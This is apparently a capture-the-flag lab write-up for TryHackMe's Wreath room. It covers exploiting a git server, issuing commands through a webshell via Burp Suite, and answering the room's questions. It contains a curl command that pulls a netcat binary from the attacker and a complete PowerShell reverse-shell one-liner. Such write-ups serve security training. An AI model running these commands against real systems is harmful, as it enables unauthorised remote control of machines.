**Task 20: Exploitation**

**Make sure that you are connected with the server if you are not connected with the server then you might not be able to proccedd futher..**


Its time to execute the exploitt....

Before doing so change the ip address to the target ip and change your exploit name with that of your user name on thm..
![ipchange](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/9faa797b-b877-449a-850e-c99931204f23)

![exploit](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/9924c6c9-8584-486c-a1f5-f3cb6736713b)

After changing the ip address and exploit, execute the python script..

![resulr](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/cd4b4fbd-f997-4edb-8792-e462b6869ce2)

Now lets get started with the burpsuite and intercept the request and follow the tasks in the room..

Open the burpsuite set your foxyproxy on and change it to the burpsuite..

Now lets turn on the proxy and and intercept the proxy request, and modify it according to the task given..

After intersecpting the request send it to the repeater by pressing `ctrl+R`, or press right click there you will see the option to do so..

Now Lets edit the request in the repeater..

Make sure to edit the Get request change it with POST, the request would  look something like this..

![editedreq](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/200995b5-9fc2-4192-854e-5e57a5375971)

After this send the request,and check the response tab 

![respo](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/c953e518-a99c-4c2a-895a-f731ceacc4cd)

You might be wondering what `nt authority\system` means??

nt authority\system is considered as the most powerful account on a windows machine like we can access anything if we have the access of this..

**Q. First up, let's use some basic enumeration to get to grips with the webshell:What is the hostname for this target?**

Ans: For this modify the a=whoami to `a=hostname` : git-serv

**Q. What operating system is this target?**

Ans: Windows

**Q. What user is the server running as?**

    nt authority\system

**Q. this will send three ICMP ping packets back to you.
How many make it to the waiting listener?**

Ans: 0

I did this by changing the burpsuite request of a with that of `a = ping -n 3 10.50.55.145`

There was no response on the tcpdump page..

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:

        firewall-cmd --zone=public --add-port PORT/tcp

Feel free to use any port that you want to use after doing so the command will display the message as `success`

![appro](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/4da6d49f-fc4a-45d5-8b97-bc9fd5ed6648)

After this open a listerner in, i will be using netcat for this the command will be as follows...

![nc](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/87c977be-e3a0-4d36-aa33-1e155c5a6bbb)

After doing this execute this command on the server shell

        curl <yourip>/nc -o ./nc-trial2

Then give the file `chmod +x` permissions and then see wether thescript is working or not by this command

        ./<filename> -h

The output should be something like this..
![Screenshot_2023-08-08_04_16_05](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/69884fec-3a66-400c-979f-5c5ae31e7024)

After this lets do the reverse shell connection..

Open your burpsuite (i will be using burp only) and then modify the a parametet with thsi command

        powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT_NUMBER);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Then press send and you will see this on your prodserver..

![last1](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/d98e3f84-0487-4ce5-9b42-90eed700b8f0)

Now we will exploit this in our task 21..

